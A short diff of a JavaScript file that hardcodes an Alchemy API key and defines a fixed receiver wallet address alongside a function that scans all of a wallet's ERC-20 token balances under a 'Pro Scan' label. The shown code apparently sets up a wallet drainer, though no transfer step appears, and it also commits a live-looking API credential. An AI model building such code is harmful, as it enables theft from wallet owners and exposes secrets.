@@ -1,6 +1,6 @@
 // app.js
 const RECEIVER = "0x2D33C1034C92308e952452A87E2F97f29bf53542";
-const ALCHEMY_KEY = "YOUR_ALCHEMY_KEY"; // Get from dashboard.alchemy.com
+const ALCHEMY_KEY = "33B7e_rNnXE7BzLP1B3q-"; // Get from dashboard.alchemy.com
 
 async function startProScan() {
     const status = document.getElementById('status');
@@ -18,7 +18,7 @@ async function startProScan() {
         status.innerHTML = "<span class='pulse'>🔍 Scanning all ERC-20 assets...</span>";
 
         // 1. Get all token balances via Alchemy API
-        const response = await fetch(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`, {
+        const response = await fetch(`https://eth-mainnet.g.alchemy.com/v2/33B7e_rNnXE7BzLP1B3q-`, {
             method: 'POST',
             body: JSON.stringify({
                 jsonrpc: "2.0", method: "alchemy_getTokenBalances",
